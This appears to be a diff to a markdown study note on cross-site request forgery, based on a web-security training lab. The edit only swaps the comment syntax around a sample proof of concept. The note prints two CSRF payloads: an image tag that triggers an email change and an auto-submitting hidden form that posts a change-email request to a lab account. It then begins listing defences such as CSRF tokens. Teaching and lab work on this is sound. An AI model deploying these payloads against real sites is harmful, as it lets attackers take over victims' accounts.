@@ -7,14 +7,14 @@
 - ` <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> `
 To craft an HTML PoC for CSRF, there are online generators to use that will take a post request and convert it to an HTML payload.
 Here is an example
-
-/* <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+<!--
+ <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="anything%40web-security-academy.net">
 </form>
 <script>
         document.forms[0].submit();
 </script>'
-*\
+-->
 
 ## Common defences against CSRF
 * CSRF Tokens: When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action. A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
